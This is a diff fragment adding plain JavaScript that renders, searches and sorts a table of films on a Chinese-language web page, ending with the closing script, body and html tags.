+var tb=document.querySelector("#tbl tbody"),key="y",asc=true,type="n",kw="";
+function render(){
+  var rows=films.filter(function(f){
+    if(kw){var s=(f.t+f.n+f.g+f.l).toLowerCase();if(s.indexOf(kw)<0)return false;}
+    return true;
+  });
+  rows.sort(function(a,b){
+    if(type==="n")return asc?a[key]-b[key]:b[key]-a[key];
+    return asc?String(a[key]).localeCompare(String(b[key]),"zh"):String(b[key]).localeCompare(String(a[key]),"zh");
+  });
+  tb.innerHTML="";
+  rows.forEach(function(f){
+    var tr=document.createElement("tr");
+    tr.innerHTML='<td>'+f.t+'</td><td class="num">'+f.y+'</td><td style="font-size:13.5px;color:var(--ink2)">'+f.l+'</td><td>'+f.g+'</td><td class="num">'+f.d+' 分</td><td style="font-size:13.5px;color:var(--ink2)">'+f.n+'</td>';
+    tb.appendChild(tr);
+  });
+  document.getElementById("cnt").textContent="共 "+rows.length+" 条 · 点击表头可切换升降序";
+  document.querySelectorAll("#tbl th").forEach(function(th){
+    th.classList.toggle("on",th.dataset.k===key);
+    th.querySelector(".ar").textContent=(th.dataset.k===key)?(asc?"↑":"↓"):"↕";
+  });
+}
+function doSearch(){kw=document.getElementById("q").value.trim().toLowerCase();render();}
+document.getElementById("q").addEventListener("input",doSearch);
+document.getElementById("q").addEventListener("search",doSearch);
+document.querySelectorAll("#tbl th").forEach(function(th){
+  th.addEventListener("click",function(){
+    var k=th.dataset.k;
+    if(key===k){asc=!asc;}else{key=k;asc=true;type=th.dataset.t;}
+    render();
+  });
+});
+render();
+</script>
+
+</body>
+</html>
